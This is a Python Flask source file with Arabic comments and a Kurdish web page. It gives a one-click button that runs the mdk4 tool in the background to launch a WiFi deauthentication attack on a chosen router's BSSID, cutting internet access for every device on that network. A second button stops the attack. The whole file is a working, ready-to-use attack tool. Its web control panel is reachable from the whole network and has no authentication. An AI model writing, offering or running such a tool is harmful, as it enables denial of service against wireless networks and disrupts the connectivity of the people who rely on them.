from flask import Flask, render_template_string, jsonify
import subprocess
import threading
import os

app = Flask(__name__)

# --- إعدادات الشبكة الخاصة بك ---
INTERFACE = "wlan0mon"       # اسم كارت الشبكة بعد تفعيل وضع المراقبة
BSSID = "AA:BB:CC:DD:EE:FF"  # !!! اكتب هنا ماك أدريس (MAC Address) الراوتر الخاص بك !!!

attack_process = None
is_attacking = False

def run_mdk4_attack():
    """دالة تشغيل أداة mdk4 لقطع الاتصال عن جميع الأجهزة عبر الهواء"""
    global attack_process
    print(f"[+] هێرشی mdk4 دەستی پێکرد لەسەر ڕاوتەری: {BSSID}")
    
    # أمر mdk4 لعزل الشبكة بالكامل (هجوم d يعني Deauthentication)
    command = ["sudo", "mdk4", INTERFACE, "d", "-a", BSSID]
    
    # تشغيل الأمر في الخلفية وكتم المخرجات الزائدة
    attack_process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# الواجهة الرسومية باللغة الكردية السورانية
HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ئامرازی بڕینی هێڵ - MDK4</title>
    <style>
        body { font-family: sans-serif; background-color: #121212; color: #e0e0e0; text-align: center; padding-top: 80px; }
        .container { max-width: 500px; margin: 0 auto; background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 1px solid #333; }
        h2 { color: #fff; }
        p { color: #aaa; font-size: 14px; }
        button { padding: 15px 30px; font-size: 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 10px; width: 85%; transition: 0.2s; }
        button:active { transform: scale(0.98); }
        .btn-isolate { background-color: #cf2e2e; color: white; }
        .btn-restore { background-color: #00adb5; color: white; }
        .status { margin-top: 30px; padding: 12px; background: #282828; border-radius: 6px; color: #eed620; font-size: 15px; border: 1px dashed #444; }
    </style>
</head>
<body>
<div class="container">
    <h2>ئامرازی بڕینی گشتی تۆڕ (MDK4) 📡</h2>
    <p>بڕینی هێڵی ئینتەرنێت لەسەر تەواوی ئامێرەکانی ناو تۆڕەکە بە یەک کلیک لە ڕێگەی هەواوە</p>
    
    <button class="btn-isolate" onclick="startAttack()">بڕینی هێڵ لەسەر هەمووان 🚫</button>
    <button class="btn-restore" onclick="stopAttack()">هێنانەوەی هێڵ بۆ هەمووان 🔄</button>
    
    <div class="status" id="statusBox">ئامادەیە بۆ وەرگرتنی فەرمان...</div>
</div>

<script>
    function startAttack() {
        document.getElementById('statusBox').innerText = "...خەریکە هێڵ لەسەر تەواوی تۆڕەکە دەبڕدرێت لە ڕێگەی MDK4";
        fetch('/api/isolate-all', { method: 'POST' })
        .then(res => res.json())
        .then(data => document.getElementById('statusBox').innerText = data.message);
    }
    function stopAttack() {
        document.getElementById('statusBox').innerText = "...خەریکە هێڵ بۆ ئامێرەکان دەگەڕێنرێتەوە";
        fetch('/api/restore-all', { method: 'POST' })
        .then(res => res.json())
        .then(data => document.getElementById('statusBox').innerText = data.message);
    }
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_INTERFACE)

@app.route('/api/isolate-all', methods=['POST'])
def isolate_all():
    global is_attacking
    if not is_attacking:
        is_attacking = True
        t = threading.Thread(target=run_mdk4_attack)
        t.daemon = True
        t.start()
    return jsonify({"success": True, "message": "ئینتەرنێت لەسەر تەواوی ئامێرەکان بڕدرا لە ڕێگەی هەواوە! 🚫"})

@app.route('/api/restore-all', methods=['POST'])
def restore_all():
    global is_attacking, attack_process
    if is_attacking:
        is_attacking = False
        if attack_process:
            attack_process.terminate() # إيقاف أداة mdk4 فوراً
            attack_process = None
        print("[+] هێرشەکە ڕاگیرا.")
    return jsonify({"success": True, "message": "هێڵ بۆ تەواوی ئامێرەکان گەڕایەوە بنەچەی خۆی. ✅"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3001, debug=False)